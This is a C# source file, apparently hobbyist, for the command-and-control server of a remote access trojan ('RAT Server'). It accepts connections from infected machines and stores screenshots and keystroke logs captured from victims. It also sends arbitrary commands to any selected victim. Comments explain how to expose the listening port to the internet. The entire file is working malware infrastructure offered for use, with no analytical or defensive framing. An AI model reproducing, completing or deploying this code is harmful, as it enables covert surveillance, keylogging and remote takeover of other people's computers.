// made by daimy
// there are a couple of debugging lines commented out. you can uncomment them

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class RATServer
{
    private static List<ClientHandler> clients = new List<ClientHandler>();

    static void Main()
    {
        int listenPort = 3000; //make sure this is the same port as in client.cs
        // run server.exe/cs then go to canyouseeme.org and check on port 3000 to ensure it works
        TcpListener listener = new TcpListener(IPAddress.Any, listenPort);
        listener.Start();
        Console.WriteLine("\n[+] RAT Server Started");
        Console.WriteLine("[+] Listening on port " + listenPort);

        Thread acceptThread = new Thread(() => AcceptConnections(listener));
        acceptThread.Start();

        MainMenu(listener);
    }

    static void MainMenu(TcpListener listener)
    {
        while (true)
        {
            Console.Clear();
            Console.WriteLine("\n====================");
            Console.WriteLine("  RAT SERVER - DAIMY  ");
            Console.WriteLine("====================");
            Console.WriteLine("1. List Clients");
            Console.WriteLine("2. Interact with Client");
            Console.WriteLine("3. Exit");
            Console.Write("Select an option: ");

            switch (Console.ReadLine())
            {
                case "1":
                    ListClients();
                    break;
                case "2":
                    InteractWithClient();
                    break;
                case "3":
                    listener.Stop();
                    Console.WriteLine("Exiting...");
                    return;
                default:
                    Console.WriteLine("Invalid option. Press Enter to continue.");
                    Console.ReadLine();
                    break;
            }
        }
    }

    static void AcceptConnections(TcpListener listener)
    {
        while (true)
        {
            TcpClient client = listener.AcceptTcpClient();
            ClientHandler handler = new ClientHandler(client, clients.Count + 1);
            clients.Add(handler);

            Thread clientThread = new Thread(() => handler.HandleClient());
            clientThread.Start();

            Console.WriteLine($"[+] New connection from {client.Client.RemoteEndPoint} (Client ID: {handler.ClientID})");
        }
    }

    static void ListClients()
    {
        Console.Clear();
        Console.WriteLine("\nConnected Clients:");

        clients.RemoveAll(client => !client.IsConnected());

        if (clients.Count == 0)
        {
            Console.WriteLine("No clients connected.");
        }
        else
        {
            foreach (var client in clients)
            {
                Console.WriteLine($"Client ID: {client.ClientID} - {client.ClientIP}");
            }
        }
        Console.WriteLine("\nPress Enter to return.");
        Console.ReadLine();
    }

    static void InteractWithClient()
    {
        Console.Clear();
        Console.Write("Enter Client ID to interact with: ");
        if (!int.TryParse(Console.ReadLine(), out int clientID))
        {
            Console.WriteLine("Invalid Client ID.");
            return;
        }

        clients.RemoveAll(client => !client.IsConnected());
        
        ClientHandler selectedClient = clients.Find(c => c.ClientID == clientID);
        if (selectedClient == null)
        {
            Console.WriteLine($"Client with ID {clientID} not found.");
            return;
        }

        Console.WriteLine($"\nInteracting with Client {selectedClient.ClientID}. Type 'back' to return.");
        selectedClient.Interact();
    }
}

class ClientHandler
{
    public int ClientID { get; }
    public string ClientIP { get; }
    private TcpClient client;
    private NetworkStream stream;
    private StreamReader reader;
    private StreamWriter writer;

    public ClientHandler(TcpClient client, int clientID)
    {
        this.client = client;
        this.ClientID = clientID;
        this.ClientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
        this.stream = client.GetStream();
        this.reader = new StreamReader(stream);
        this.writer = new StreamWriter(stream) { AutoFlush = true };
    }

    public void HandleClient()
    {
        try
        {
            string screenshotsDirectory = "screenshots";
            if (!Directory.Exists(screenshotsDirectory))
            {
                Directory.CreateDirectory(screenshotsDirectory);
            }
            string logsDirectory = "logs";
            if (!Directory.Exists(logsDirectory))
            {
                Directory.CreateDirectory(logsDirectory);
            }

            string line;
            while (!string.IsNullOrWhiteSpace(line = reader.ReadLine()))
            {
                // Console.WriteLine($"[Client {ClientID}] Received: {line}");
            }

            while (true)
            {
                line = reader.ReadLine();
                if (line == null)
                {
                    Console.WriteLine($"[Client {ClientID}] Disconnected.");
                    break;
                }

                if (line.StartsWith("[SCREENSHOT]"))
                {
                    string base64Image = line.Replace("[SCREENSHOT] ", "");
                    byte[] imageData = Convert.FromBase64String(base64Image);

                    string screenshotPath = Path.Combine(screenshotsDirectory, $"screenshot_{ClientID}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
                    File.WriteAllBytes(screenshotPath, imageData);

                    Console.WriteLine($"[Client {ClientID}] Screenshot saved to {screenshotPath}");
                }
                else if (line.StartsWith("[KEYLOG]"))
                {
                    string logEntry = line.Replace("[KEYLOG] ", "");
                    File.AppendAllText($"logs/keylog_{ClientID}.txt", logEntry + Environment.NewLine);

                    // Console.WriteLine($"[Client {ClientID}] Keylog: {logEntry}");
                }
                else
                {
                    Console.WriteLine($"[Client {ClientID}] {line}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Client {ClientID} Error] {ex.Message}");
        }
    }

    public bool IsConnected()
    {
        try
        {
            return !(client.Client.Poll(1, SelectMode.SelectRead) && client.Client.Available == 0);
        }
        catch
        {
            return false;
        }
    }

    public void Interact()
    {
        while (true)
        {
            Console.Write($"Client {ClientID}> ");
            string command = Console.ReadLine();

            if (command.ToLower() == "back")
            {
                break;
            }

            writer.WriteLine(command);
        }
    }
}
